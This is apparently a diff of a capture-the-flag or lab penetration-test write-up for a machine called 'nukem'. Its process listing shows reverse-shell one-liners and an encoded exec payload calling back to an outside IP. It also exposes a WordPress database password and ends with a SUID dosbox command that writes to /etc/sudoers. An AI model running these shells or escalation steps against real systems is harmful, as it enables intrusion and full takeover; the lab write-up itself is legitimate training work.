+command+     389  0.0  0.0   3876  1152 ?        S    17:33   0:00 xinit /etc/lightdm/Xsession startxfce4 -- /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
+http         391  0.0  0.9  74812 18400 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         392  0.0  0.9  74792 18796 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         393  0.0  0.9  74792 18500 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         394  0.0  0.9  74812 18784 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         395  0.0  0.9  74812 18512 ?        S    17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
+command+     402  0.0  3.6 199496 74528 ?        S    17:33   0:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
+command+     415  0.0  2.9 405096 59948 ?        Sl   17:33   0:00 xfce4-session
+command+     420  0.0  0.2   7256  4284 ?        Ss   17:33   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         422  0.0  0.3 160256  7620 ?        Sl   17:33   0:00 lightdm --session-child 18 21
+lightdm      428  0.0  0.5  20276 10160 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd --user
+lightdm      430  0.0  0.1  31924  2916 ?        S    17:33   0:00 (sd-pam)
+lightdm      439  0.0  3.5 415564 72348 ?        Ssl  17:33   0:01 /usr/bin/lightdm-gtk-greeter
+lightdm      441  0.0  0.1   6960  3724 ?        Ss   17:33   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+lightdm      442  0.0  0.3 304152  6124 ?        Ssl  17:33   0:00 /usr/lib/at-spi-bus-launcher
+lightdm      448  0.0  0.1   6960  3532 ?        S    17:33   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+command+     449  0.0  0.3 304152  6420 ?        Ssl  17:33   0:00 /usr/lib/at-spi-bus-launcher
+command+     455  0.0  0.1   7092  4048 ?        S    17:33   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+command+     459  0.0  0.2 229176  5680 ?        Sl   17:33   0:00 /usr/lib/xfce4/xfconf/xfconfd
+polkitd      469  0.0  1.0 2569800 20400 ?       Ssl  17:33   0:00 /usr/lib/polkit-1/polkitd --no-debug
+command+     470  0.0  0.3 160720  7280 ?        Sl   17:33   0:00 /usr/lib/at-spi2-registryd --use-gnome-session
+command+     482  0.0  0.0   5892   448 ?        Ss   17:33   0:00 /usr/bin/ssh-agent -s
+command+     485  0.0  0.0 151796  1284 ?        SLs  17:33   0:00 /usr/bin/gpg-agent --supervised
+command+     487  0.0  4.1 352460 83772 ?        Sl   17:33   0:00 xfwm4
+root         491  0.0  0.2  12868  6060 ?        S    17:33   0:00 lightdm --session-child 14 21
+lightdm      494  0.0  0.2 160580  5728 ?        Sl   17:33   0:00 /usr/lib/at-spi2-registryd --use-gnome-session
+command+     498  0.0  0.9 218104 20000 ?        Ssl  17:33   0:00 xfsettingsd
+command+     499  0.0  1.4 261528 30032 ?        Sl   17:33   0:00 xfce4-panel
+command+     505  0.0  1.0 331484 22228 ?        Sl   17:33   0:00 Thunar --daemon
+command+     510  0.0  1.6 265880 34144 ?        Sl   17:33   0:00 xfdesktop
+command+     511  0.0  1.0 182616 21784 ?        Sl   17:33   0:00 /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libsystray.so 6 12582920 systray Notification Area Area where notification icons appear
+command+     512  0.0  1.3 185780 27120 ?        Sl   17:33   0:00 /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libxfce4powermanager.so 9 12582921 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
+command+     513  0.0  1.1 184500 24332 ?        Sl   17:33   0:00 /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libactions.so 14 12582922 actions Action Buttons Log out, lock or other system actions
+root         523  0.0  0.4 312332  8916 ?        Ssl  17:33   0:00 /usr/lib/upowerd
+command+     527  0.0  1.0  39432 22064 ?        S    17:33   0:04 /usr/bin/vmtoolsd -n vmusr
+command+     531  0.0  1.0 182012 20340 ?        Sl   17:33   0:00 /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1
+command+     537  0.0  0.9 182980 18928 ?        Ssl  17:33   0:00 xfce4-power-manager
+root         553  0.0  1.5  44804 31636 ?        Ss   17:35   0:01 /usr/bin/python /home/commander/python_rest_flask/server.py
+root         554  0.0  1.3  85552 27288 ?        Ss   17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         555  0.0  0.0   9132  1100 ?        Ss   17:35   0:00 nginx: master process /usr/bin/nginx -g pid /run/nginx.pid; error_log stderr;
+http         556  0.0  0.1   9916  3592 ?        S    17:35   0:00 nginx: worker process
+root         558  0.0  0.4  83328  9444 ?        S    17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         559  0.0  0.2  83320  4744 ?        S    17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         560  0.0  0.4  85552  9880 ?        S    17:35   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+systemd+     613  0.0  0.4  19388  9092 ?        Ss   17:44   0:00 /usr/lib/systemd/systemd-networkd
+root         614  0.0  0.0      0     0 ?        I    17:44   0:00 [kworker/0:3-events]
+http         636  0.0  0.9  74812 18808 ?        S    17:45   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         646  0.0  0.9  74808 18520 ?        S    17:47   0:00 /usr/bin/httpd -k start -DFOREGROUND
+root         852  0.0  0.0      0     0 ?        I    18:58   0:00 [kworker/u2:1-events_power_efficient]
+http         853  0.0  0.4  10724  8620 ?        S    18:59   0:00 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")
+http         854  0.0  0.1   4428  3640 pts/0    Ss+  18:59   0:00 /bin/bash
+http         892  0.0  0.4  10724  8640 ?        S    19:00   0:00 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")
+http         893  0.0  0.1   4428  3784 pts/1    Ss+  19:00   0:00 /bin/bash
+http         929  0.0  0.4  10724  8540 ?        S    19:00   0:00 python3 -c import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")
+http         930  0.0  0.1   4428  3552 pts/2    Ss+  19:00   0:00 /bin/bash
+http         931  0.0  0.6  74584 13680 ?        S    19:00   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         950  0.0  0.6  74452 13324 ?        S    19:06   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http         963  0.0  0.6  74452 13332 ?        S    19:10   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http        1013  0.0  0.1   4164  2908 ?        S    19:14   0:00 sh -c 0<&196;exec 196<>/dev/tcp/192.168.45.151/80; bash <&196 >&196 2>&196
+http        1014  0.0  0.1   4164  3092 ?        S    19:14   0:00 bash
+http        1042  0.0  0.4  11608  9680 ?        S    19:14   0:00 /usr/sbin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("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")))
+http        1043  0.0  0.1   4428  3760 pts/3    Ss   19:14   0:00 /usr/sbin/bash -i
+http        1176  0.0  0.1   4084  2940 pts/3    S+   20:12   0:00 bash ./pg_privesc.sh
+http        1178  0.0  0.0   4084   268 pts/3    S+   20:12   0:00 bash ./pg_privesc.sh
+http        1180  0.0  0.0   2364   648 pts/3    S+   20:12   0:00 tee -a privesc_2026-01-22_201215.txt
+root        1209  0.0  0.0      0     0 ?        I    20:12   0:00 [kworker/0:0-memcg_kmem_cache]
+http        1239  0.0  0.1   6624  2888 pts/3    R+   20:12   0:00 ps aux
 
-ss -tulwn 2>/dev/null
+$ ss -tulwn 2>/dev/null
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
+icmp6 UNCONN 0      0           *%ens192:58               *:*          
+tcp   LISTEN 0      50           0.0.0.0:36445      0.0.0.0:*          
+tcp   LISTEN 0      128          0.0.0.0:5000       0.0.0.0:*          
+tcp   LISTEN 0      511          0.0.0.0:13000      0.0.0.0:*          
+tcp   LISTEN 0      5          127.0.0.1:5901       0.0.0.0:*          
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
+tcp   LISTEN 0      50              [::]:36445         [::]:*          
+tcp   LISTEN 0      80                 *:3306             *:*          
+tcp   LISTEN 0      511                *:80               *:*          
+tcp   LISTEN 0      128             [::]:22            [::]:*          
 
-netstat -tulnp 2>/dev/null
+[+] netstat -tulnp
+$ netstat -tulnp 2>/dev/null
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:36445           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:13000           0.0.0.0:*               LISTEN      556/nginx: worker p 
+tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::36445                :::*                    LISTEN      -                   
+tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+
+
 ```
 
 7.  Software / Packages
 
 ```
-dpkg -l 2>/dev/null | head -n 200
+[+] dpkg -l (first 200)
+$ dpkg -l 2>/dev/null | head -n 200
 
-rpm -qa 2>/dev/null | head -n 200
+[+] rpm -qa (first 200)
+$ rpm -qa 2>/dev/null | head -n 200
+
 ```
 
 8. Loot Files & Credentials
 
 ```
-grep -R "password" /etc 2>/dev/null | head -n 50
+[+] grep password in /etc (first 50)
+$ grep -R "password" /etc 2>/dev/null | head -n 50
+/etc/login.defs:#       PASS_MAX_DAYS   Maximum number of days a password may be used.
+/etc/login.defs:#       PASS_MIN_DAYS   Minimum number of days allowed between password changes.
+/etc/login.defs:#       PASS_WARN_AGE   Number of days warning given before a password expires.
+/etc/login.defs:# Max number of login retries if password is bad
+/etc/login.defs:# Hash shadow passwords with SHA512.
+/etc/sudo.conf:# password prompt for "sudo -A" support.  Sudo does not ship with its
+/etc/pam.d/newusers:password    required        pam_unix.so sha512 shadow
+/etc/pam.d/rlogin:password   include      system-auth
+/etc/pam.d/lightdm-autologin:password    include     system-local-login
+/etc/pam.d/usermod:password     required        pam_permit.so
+/etc/pam.d/system-remote-login:password  include   system-login
+/etc/pam.d/chsh:password        required        pam_permit.so
+/etc/pam.d/chgpasswd:password   include         system-auth
+/etc/pam.d/userdel:password     required        pam_permit.so
+/etc/pam.d/groupmod:password    required        pam_permit.so
+/etc/pam.d/shadow:password      required        pam_permit.so
+/etc/pam.d/chpasswd:password    required        pam_unix.so sha512 shadow
+/etc/pam.d/passwd:#password     required        pam_cracklib.so difok=2 minlen=8 dcredit=2 ocredit=2 retry=3
+/etc/pam.d/passwd:#password     required        pam_unix.so sha512 shadow use_authtok
+/etc/pam.d/passwd:password      required        pam_unix.so sha512 shadow nullok
+/etc/pam.d/system-auth:# Optionally use requisite above if you do not want to prompt for the password
+/etc/pam.d/system-auth:-password  [success=1 default=ignore]  pam_systemd_home.so
+/etc/pam.d/system-auth:password   required                    pam_unix.so          try_first_pass nullok shadow
+/etc/pam.d/system-auth:password   optional                    pam_permit.so
+/etc/pam.d/system-login:password   include    system-auth
+/etc/pam.d/other:password  required   pam_deny.so
+/etc/pam.d/other:password  required   pam_warn.so
+/etc/pam.d/system-local-login:password  include   system-login
+/etc/pam.d/chfn:password        required        pam_permit.so
+/etc/pam.d/vlock:password required pam_unix.so
+/etc/pam.d/groupmems:password   include         system-auth
+/etc/pam.d/lightdm-greeter:# Can't change password
+/etc/pam.d/lightdm-greeter:password  required pam_deny.so
+/etc/pam.d/chage:password       required        pam_permit.so
+/etc/pam.d/groupadd:password    required        pam_permit.so
+/etc/pam.d/useradd:password     required        pam_permit.so
+/etc/pam.d/sshd:password  include   system-remote-login
+/etc/pam.d/groupdel:password    required        pam_permit.so
+/etc/pam.d/polkit-1:password   include      system-auth
+/etc/pam.d/lightdm:password    include     system-login
+/etc/ssl/misc/tsget.pl:    print STDERR "[-v] [-d] [-k <private_key.pem>] [-p <key_password>] ";
+/etc/ssl/misc/tsget:    print STDERR "[-v] [-d] [-k <private_key.pem>] [-p <key_password>] ";
+/etc/ssl/openssl.cnf:# input_password = secret
+/etc/ssl/openssl.cnf:# output_password = secret
+/etc/ssl/openssl.cnf:challengePassword          = A challenge password
+/etc/ssl/openssl.cnf.dist:# input_password = secret
+/etc/ssl/openssl.cnf.dist:# output_password = secret
+/etc/ssl/openssl.cnf.dist:challengePassword             = A challenge password
+/etc/php/php.ini:; out of your application such as database usernames and passwords or worse.
+/etc/php/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
 
-ls -la /var/www 2>/dev/null
+[+] web roots
+$ ls -la /var/www 2>/dev/null
 
-grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50
+[+] web creds (first 50)
+$ grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50
 
-find /home -type f -name "*.txt" 2>/dev/null
+[+] text files in /home
+$ find /home -type f -name "*.txt" 2>/dev/null
+/home/commander/python_rest_flask/requirements.txt
+/home/commander/local.txt
 
-find /home -type f -name "*history*" 2>/dev/null
+[+] history files in /home
+$ find /home -type f -name "*history*" 2>/dev/null
+/home/commander/.bash_history
 
-find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null
+[+] ssh keys in /home
+$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null
 
-grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
+[+] sensitive strings in /home (first 50)
+$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
+/home/commander/python_rest_flask/server.py:        result = {'data': [dict(zip(tuple (query.keys()) ,i)) for i in query.cursor]}
+/home/commander/python_rest_flask/server.py:        result = {'data': [dict(zip(tuple (query.keys()) ,i)) for i in query.cursor]}
+Binary file /home/commander/python_rest_flask/chinook.db matches
 
-find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
+[+] backup files (first 50)
+$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
+/var/log/journal/54ecd58cf3cf489fa4da8e9f52e4440e/user-1000@00062f2fc9efdaf2-90265ba8065642b5.journal~
+/var/log/journal/54ecd58cf3cf489fa4da8e9f52e4440e/system@00062f2fc9a2b094-ec04cbb9d7e974a6.journal~
+/var/log/journal/54ecd58cf3cf489fa4
 ```
 
 9.  Containers / Virtualization
 
 ```
-ls -la /.dockerenv 2>/dev/null
+[+] docker env file
+$ ls -la /.dockerenv 2>/dev/null
 
-grep -i docker /proc/1/cgroup 2>/dev/null
+[+] cgroup hints
+
 ```
 
 10. Automated Enumeration 
 
 ```
+-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                                                                                   
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'commander' );
+define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+define( 'DB_HOST', 'localhost' );
 
+Analyzing VNC Files (limit 70)
+drwxr-xr-x 2 commander root 4096 Sep 18  2020 /home/commander/.vnc                                                                                                                                                 
+-rw------- 1 commander commander 8 Sep 18  2020 /home/commander/.vnc/passwd
+
+-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
+
+-rwsr-xr-x 1 root root 44K Sep  7  2020 /usr/bin/sg (Unknown SUID binary!)
+
+/srv/http/.bash_history
 
 ```
 
 11. Possible PE Paths
 
 ```
+tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN
+
+command+     402  0.0  3.6 199496 74528 ?        S    17:33   0:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000 
+
+-rwxr-xr-x   1 root root   877 Sep 18  2020 build_arch.sh
+
+git:x:973:973:git daemon user:/:/usr/bin/git-shell
+
+Linux version 5.8.9-arch2-1 (linux@archlinux) (gcc (GCC) 10.2.0, GNU ld (GNU Binutils) 2.35) #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000                                                                        
+LSB Version:    1.4
+
+Sudo version 1.9.3p1 
+
+root         553  0.0  1.5  44804 31636 ?        Ss   17:35   0:01 /usr/bin/python /home/commander/python_rest_flask/server.py
+
+-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                                                                                   
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'commander' );
+define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+define( 'DB_HOST', 'localhost' );
+
+-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
+
+-rwsr-xr-x 1 root root 44K Sep  7  2020 /usr/bin/sg (Unknown SUID binary!)
+
+/srv/http/.bash_history
+
+/run/user/1000/systemd/generator.late/app-xfsettingsd-autostart.service
+/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants/app-xfsettingsd-autostart.service
 
 ```
 
 **Privilege Escalation**
 
 1. PE Steps
+- Used credentials found in  /srv/http/wp-config.php to login as commander.
+
+```
+su commander
+```
+
+- Found suid binary -rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox.
+
+- Using instructions found on gtfobins, trial and error, and a hint, used this command to add commander to the suders file.
+
+```
+[commander@nukem ~]$ LFILE = '/etc/sudoers'
+-bash: LFILE: command not found
+[commander@nukem ~]$ LFILE='/etc/sudoers'
+[commander@nukem ~]$ dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
+DOSBox version 0.74-3
 
 ```
 
-```
+![[Pasted image 20260122153140.png]]
 
+- Was able to sudo -su and cat contents of proof.txt
+
+![[Pasted image 20260122153339.png]]
 2. Notes
 
 ```
